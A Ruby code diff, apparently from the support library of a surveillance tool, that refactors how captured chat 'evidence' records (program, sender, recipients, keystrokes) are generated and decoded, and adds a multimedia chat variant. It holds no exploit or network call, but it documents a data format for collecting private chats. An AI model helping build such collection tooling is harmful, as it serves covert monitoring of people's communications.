@@ -5,11 +5,7 @@ require 'rcs-common/evidence/common'
 
 module RCS
 
-module ChatEvidence
-  include RCS::Tracer
-
-  ELEM_DELIMITER = 0xABADC0DE
-  KEYSTROKES = ["привет мир", "こんにちは世界", "Hello world!", "Ciao mondo!"]
+module Chat
 
   CHAT_PROGRAM = {
       0x01 => :skype,
@@ -30,9 +26,57 @@ module ChatEvidence
 
   CHAT_INCOMING = 0x01
 
+  def decode_from_to(common_info, stream)
+    tm = stream.read 36
+    info = Hash[common_info]
+    info[:da] = Time.gm(*(tm.unpack('L*')), 0)
+    info[:data] = Hash.new if info[:data].nil?
+
+    program = stream.read(4).unpack('L').first
+    info[:data][:program] = CHAT_PROGRAM[program]
+
+    flags = stream.read(4).unpack('L').first
+    info[:data][:incoming] = (flags & CHAT_INCOMING != 0) ? 1 : 0
+
+    from = stream.read_utf16le_string
+    info[:data][:from] = from.utf16le_to_utf8
+    #trace :debug, "CHAT from: #{info[:data][:from]}"
+    from_display = stream.read_utf16le_string
+    info[:data][:from_display] = from_display.utf16le_to_utf8
+    #trace :debug, "CHAT from_display: #{info[:data][:from_display]}"
+
+    rcpt = stream.read_utf16le_string
+    info[:data][:rcpt] = rcpt.utf16le_to_utf8
+
+    # remove the sender from the recipients (damned lazy Naga who does not want to parse it on the client)
+    recipients = info[:data][:rcpt].split(',')
+    recipients.delete(info[:data][:from])
+    info[:data][:rcpt] = recipients.join(',')
+    #trace :debug, "CHAT rcpt: #{info[:data][:rcpt]}"
+
+    rcpt_display = stream.read_utf16le_string
+    info[:data][:rcpt_display] = rcpt_display.utf16le_to_utf8
+    if info[:data][:program] == :skype
+      # remove the sender from the recipients (damned lazy Naga who does not want to parse it on the client)
+      recipients = info[:data][:rcpt_display].split(',')
+      recipients.delete(info[:data][:from])
+      info[:data][:rcpt_display] = recipients.join(',')
+    end
+    #trace :debug, "CHAT rcpt_display: #{info[:data][:rcpt_display]}"
+
+    return info
+  end
+end
+
+module ChatEvidence
+  include RCS::Tracer
+  include Chat
+
+  ELEM_DELIMITER = 0xABADC0DE
+  KEYSTROKES = ["привет мир", "こんにちは世界", "Hello world!", "Ciao mondo!"]
+
   def content
     program = [CHAT_PROGRAM.keys.sample].pack('L')
-    flags = [[0,1].sample].pack('L')
     users = ["ALoR", "Bruno", "Naga", "Quez", "Tizio", "Caio"]
     from = users.sample.to_utf16le_binary_null
     to = users.sample.to_utf16le_binary_null
@@ -41,7 +85,7 @@ module ChatEvidence
     t = Time.now.getutc
     content.write [t.sec, t.min, t.hour, t.mday, t.mon, t.year, t.wday, t.yday, t.isdst ? 0 : 1].pack('l*')
     content.write program
-    content.write flags
+    content.write [0].pack('L')
     content.write from
     content.write from
     content.write to
@@ -49,55 +93,29 @@ module ChatEvidence
     content.write KEYSTROKES.sample.to_utf16le_binary_null
     content.write [ ELEM_DELIMITER ].pack('L')
 
+    content.write [t.sec + 5, t.min, t.hour, t.mday, t.mon, t.year, t.wday, t.yday, t.isdst ? 0 : 1].pack('l*')
+    content.write program
+    content.write [1].pack('L')
+    content.write to
+    content.write to
+    content.write from
+    content.write from
+    content.write KEYSTROKES.sample.to_utf16le_binary_null
+    content.write [ ELEM_DELIMITER ].pack('L')
+
     content.string
   end
 
   def generate_content
-    ret = Array.new
-    10.rand_times { ret << content() }
-    ret
+    [ content ]
   end
 
   def decode_content(common_info, chunks)
     stream = StringIO.new chunks.join
 
     until stream.eof?
-      tm = stream.read 36
-      info = Hash[common_info]
-      info[:da] = Time.gm(*(tm.unpack('L*')), 0)
-      info[:data] = Hash.new if info[:data].nil?
 
-      program = stream.read(4).unpack('L').first
-      info[:data][:program] = CHAT_PROGRAM[program]
-
-      flags = stream.read(4).unpack('L').first
-      info[:data][:incoming] = (flags & CHAT_INCOMING != 0) ? 1 : 0
-
-      from = stream.read_utf16le_string
-      info[:data][:from] = from.utf16le_to_utf8
-      #trace :debug, "CHAT from: #{info[:data][:from]}"
-      from_display = stream.read_utf16le_string
-      info[:data][:from_display] = from_display.utf16le_to_utf8
-      #trace :debug, "CHAT from_display: #{info[:data][:from_display]}"
-
-      rcpt = stream.read_utf16le_string
-      info[:data][:rcpt] = rcpt.utf16le_to_utf8
-
-      # remove the sender from the recipients (damned lazy Naga who does not want to parse it on the client)
-      recipients = info[:data][:rcpt].split(',')
-      recipients.delete(info[:data][:from])
-      info[:data][:rcpt] = recipients.join(',')
-      #trace :debug, "CHAT rcpt: #{info[:data][:rcpt]}"
-
-      rcpt_display = stream.read_utf16le_string
-      info[:data][:rcpt_display] = rcpt_display.utf16le_to_utf8
-      if info[:data][:program] == :skype
-        # remove the sender from the recipients (damned lazy Naga who does not want to parse it on the client)
-        recipients = info[:data][:rcpt_display].split(',')
-        recipients.delete(info[:data][:from])
-        info[:data][:rcpt_display] = recipients.join(',')
-      end
-      #trace :debug, "CHAT rcpt_display: #{info[:data][:rcpt_display]}"
+      info = decode_from_to(common_info, stream)
 
       keystrokes = stream.read_utf16le_string
       info[:data][:content] = keystrokes.utf16le_to_utf8 unless keystrokes.nil?
@@ -111,6 +129,60 @@ module ChatEvidence
     :delete_raw
   end
 end # ChatEvidence
+
+
+module ChatmmEvidence
+  include RCS::Tracer
+  include Chat
+
+  def content
+    path = File.join(File.dirname(__FILE__), 'content', 'screenshot', '00' + (rand(3) + 1).to_s + '.jpg')
+    File.open(path, 'rb') {|f| f.read }
+  end
+
+  def generate_content
+    [ content ]
+  end
+
+  def additional_header
+     program = [CHAT_PROGRAM.keys.sample].pack('L')
+     flags = [[0,1].sample].pack('L')
+     users = ["ALoR", "Bruno", "Naga", "Quez", "Tizio", "Caio"]
+     from = users.sample.to_utf16le_binary_null
+     to = users.sample.to_utf16le_binary_null
+
+     header = StringIO.new
+     t = Time.now.getutc
+     header.write [t.sec, t.min, t.hour, t.mday, t.mon, t.year, t.wday, t.yday, t.isdst ? 0 : 1].pack('l*')
+     header.write program
+     header.write flags
+     header.write from
+     header.write from
+     header.write to
+     header.write to
+
+     header.string
+   end
+
+
+  def decode_additional_header(data)
+    raise EvidenceDeserializeError.new("incomplete CHAT MultiMedia") if data.nil? or data.bytesize == 0
+
+    stream = StringIO.new data
+    info = decode_from_to({}, stream)
+
+    return info
+   end
+
+  def decode_content(common_info, chunks)
+    info = Hash[common_info]
+    info[:data] ||= Hash.new
+    info[:grid_content] = chunks.join
+    yield info if block_given?
+    :delete_raw
+  end
+
+end
 
 
 module ChatoldEvidence
